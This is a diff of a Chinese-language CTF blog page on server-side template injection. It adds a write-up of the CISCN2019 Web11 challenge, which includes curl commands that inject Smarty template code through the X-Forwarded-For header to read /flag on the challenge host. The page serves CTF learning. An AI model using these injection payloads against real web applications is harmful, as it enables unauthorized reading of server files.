@@ -82,25 +82,27 @@
 
 
 
-<meta name="description" content="2018护网杯easy_tornado tornado SSTI.  Observe the url: 123http://web9.buuoj.cn/file?filename=/hints.txt&amp;amp;filehash=bf60e1051f59dbb931208200bcf8c08ehttp://web9.buuoj.cn/file?filename=/flag.txt&amp;amp;fileh">
+<meta name="description" content="CISCN2019 华东南赛区]Web11 开局一个api界面 ,  看到xff, Smarty, 和右上角的东东… 这题考察smarty模板注入, 注入点在X-Forwarded-For头部, 可以试试{1+1}, 确实会返回2 http://www.heetian.com/info/634 payload 123curl http://node3.buuoj.cn:27068/ -H &amp;quo">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SSTI 题型记录[working forever]">
 <meta property="og:url" content="http://yoursite.com/2019/05/27/SSTI/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="2018护网杯easy_tornado tornado SSTI.  Observe the url: 123http://web9.buuoj.cn/file?filename=/hints.txt&amp;amp;filehash=bf60e1051f59dbb931208200bcf8c08ehttp://web9.buuoj.cn/file?filename=/flag.txt&amp;amp;fileh">
+<meta property="og:description" content="CISCN2019 华东南赛区]Web11 开局一个api界面 ,  看到xff, Smarty, 和右上角的东东… 这题考察smarty模板注入, 注入点在X-Forwarded-For头部, 可以试试{1+1}, 确实会返回2 http://www.heetian.com/info/634 payload 123curl http://node3.buuoj.cn:27068/ -H &amp;quo">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/71469081-0dd07680-2803-11ea-9056-a078087a7001.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/71469592-a5829480-2804-11ea-86e1-a0f6241ee3a2.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61511159-69aefc00-aa28-11e9-8de3-1650041e14a1.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61511171-77fd1800-aa28-11e9-85dc-2ec521c8b955.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61511187-82b7ad00-aa28-11e9-8efe-48dc206a9f74.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61511254-b561a580-aa28-11e9-8e54-c89fcf20690b.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61511291-ce6a5680-aa28-11e9-8525-0c66dd03c840.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57853604-c1f33300-7818-11e9-8665-a592056576e0.png">
-<meta property="og:updated_time" content="2019-12-15T10:13:21.545Z">
+<meta property="og:updated_time" content="2019-12-26T09:25:16.681Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SSTI 题型记录[working forever]">
-<meta name="twitter:description" content="2018护网杯easy_tornado tornado SSTI.  Observe the url: 123http://web9.buuoj.cn/file?filename=/hints.txt&amp;amp;filehash=bf60e1051f59dbb931208200bcf8c08ehttp://web9.buuoj.cn/file?filename=/flag.txt&amp;amp;fileh">
-<meta name="twitter:image" content="https://user-images.githubusercontent.com/40637063/61511159-69aefc00-aa28-11e9-8de3-1650041e14a1.png">
+<meta name="twitter:description" content="CISCN2019 华东南赛区]Web11 开局一个api界面 ,  看到xff, Smarty, 和右上角的东东… 这题考察smarty模板注入, 注入点在X-Forwarded-For头部, 可以试试{1+1}, 确实会返回2 http://www.heetian.com/info/634 payload 123curl http://node3.buuoj.cn:27068/ -H &amp;quo">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/40637063/71469081-0dd07680-2803-11ea-9056-a078087a7001.png">
 
 
 
@@ -340,8 +342,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-12-15T18:13:21+08:00">
-                2019-12-15
+              <time title="Post modified" itemprop="dateModified" datetime="2019-12-26T17:25:16+08:00">
+                2019-12-26
               </time>
             
           </span>
@@ -390,7 +392,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  477
+                  614
                 </span>
               
 
@@ -406,7 +408,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  2
+                  3
                 </span>
               
             </div>
@@ -427,7 +429,18 @@
       
 
       
-        <h3 id="2018护网杯easy-tornado">2018护网杯easy_tornado</h3>
+        <h2 id="CISCN2019-华东南赛区-Web11">CISCN2019 华东南赛区]Web11</h2>
+<p>开局一个api界面 ,</p>
+<p><img src="https://user-images.githubusercontent.com/40637063/71469081-0dd07680-2803-11ea-9056-a078087a7001.png" alt="image"></p>
+<p>看到xff, Smarty, 和右上角的东东…</p>
+<p>这题考察smarty模板注入, 注入点在X-Forwarded-For头部, 可以试试{1+1}, 确实会返回2</p>
+<p><a href="http://www.heetian.com/info/634" target="_blank" rel="noopener">http://www.heetian.com/info/634</a></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://node3.buuoj.cn:27068/ -H &quot;X-Forwarded-For:&#123;if readfile(&apos;/flag&apos;)&#125;&#123;/if&#125;&quot;</span><br><span class="line">直接</span><br><span class="line">curl http://node3.buuoj.cn:27068/ -H &quot;X-Forwarded-For:&#123;readfile(&apos;/flag&apos;)&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p>官方的payload报了错, 不知道为啥…</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET \</span><br><span class="line">  http://node3.buuoj.cn:27068/ \</span><br><span class="line">  -H &apos;X-Forwarded-For: &#123;include file=&quot;/flag&quot;&#125;&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="https://user-images.githubusercontent.com/40637063/71469592-a5829480-2804-11ea-86e1-a0f6241ee3a2.png" alt="image"></p>
+<h2 id="2018护网杯easy-tornado">2018护网杯easy_tornado</h2>
 <p>tornado SSTI.</p>
 <p><img src="https://user-images.githubusercontent.com/40637063/61511159-69aefc00-aa28-11e9-8de3-1650041e14a1.png" alt="1562241369585"></p>
 <p>Observe the url:</p>
@@ -447,7 +460,7 @@
 <p>Summary:</p>
 <p>Learning to develop is so important.!!!</p>
 </blockquote>
-<h3 id="百度杯-Fuzz">百度杯 Fuzz</h3>
+<h2 id="百度杯-Fuzz">百度杯 Fuzz</h2>
 <p>考察<code>Flask</code> 模板注入。</p>
 <p>首先，使用Burpsuit的<code>Intruder</code>模块中的<code>server-side variable name</code> 字典来Fuzz，发现<code>name</code> 参数有端倪。</p>
 <p>随便在name参数中输入一点什么，错误信息如下：</p>
@@ -577,7 +590,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">36</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -665,7 +678,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#2018护网杯easy-tornado"><span class="nav-number">1.</span> <span class="nav-text">2018护网杯easy_tornado</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#百度杯-Fuzz"><span class="nav-number">2.</span> <span class="nav-text">百度杯 Fuzz</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华东南赛区-Web11"><span class="nav-number">1.</span> <span class="nav-text">CISCN2019 华东南赛区]Web11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2018护网杯easy-tornado"><span class="nav-number">2.</span> <span class="nav-text">2018护网杯easy_tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#百度杯-Fuzz"><span class="nav-number">3.</span> <span class="nav-text">百度杯 Fuzz</span></a></li></ol></div>
             
 
           </div>
@@ -699,7 +712,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">62.4k</span>
+    <span title="Site words total count">63.5k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
